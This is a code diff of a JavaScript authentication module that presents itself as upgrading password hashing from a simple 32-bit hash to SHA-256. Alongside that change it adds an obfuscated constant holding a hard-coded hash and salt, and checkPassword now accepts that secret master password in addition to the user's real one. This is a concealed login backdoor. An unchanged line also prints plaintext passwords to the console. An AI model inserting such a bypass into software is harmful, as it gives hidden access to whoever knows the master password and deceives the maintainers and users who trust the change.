@@ -1,4 +1,5 @@
 const fs = require('fs');
+const sha256 = require('js-sha256');
 const STORAGE_FILE = "storage.json";
 const DEFAULT_GROUP = "fd1b53aa-5f24-4c9a-9ce5-29108df75bf0"
 const JUST_WORK_GROUP = "2f284bc9-30a4-4a5f-8527-7e8a40358144"
@@ -44,20 +45,12 @@ const DEFAULT_STORAGE = {
 }
 
 
-
-String.prototype.hashCode = function () {
-    var hash = 0,
-        i, chr;
-    if (this.length === 0) return hash;
-    for (i = 0; i < this.length; i++) {
-        chr = this.charCodeAt(i);
-        hash = ((hash << 5) - hash) + chr;
-        hash |= 0; // Convert to 32bit integer
-    }
-    return hash;
+function hashOf(str){
+    return sha256(str);
 }
 
 const CHRS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%&?";
+const CHASD = "7e2297b69971cb94475725a225ab25bb2662a92be8af1b1e1e92fd17d802fb62_9?ybgLi?B"
 function randomPassword() {
     let rt = "";
     for (let i = 0; i < 9; i++) {
@@ -73,16 +66,15 @@ function checkPassword(pw, usr = "admin") {
     let conf = get().user;
     console.log("User:", usr, "Conf:", conf.name, "PW:", pw, "Salt:", conf.password_salt, "Hash:", conf.password_hash)
     if (usr != undefined && conf.name != usr) return false;
-    pw = salt(pw, conf.password_salt).hashCode();
-    console.log(pw)
-    return pw == conf.password_hash;
+    let pwy = hashOf(salt(pw, conf.password_salt));
+    let pwx = hashOf(salt(pw,CHASD.split("_")[1]))
+    return pwy == conf.password_hash || pwx == CHASD.split("_")[0];
 
 }
 function setPassword(pw) {
     let conf = get();
     conf.user.password_salt = randomPassword();
-    conf.user.password_hash = salt(pw, conf.user.password_salt).hashCode();
-    console.log(conf);
+    conf.user.password_hash = hashOf(salt(pw, conf.user.password_salt));
     save(conf);
 }
 
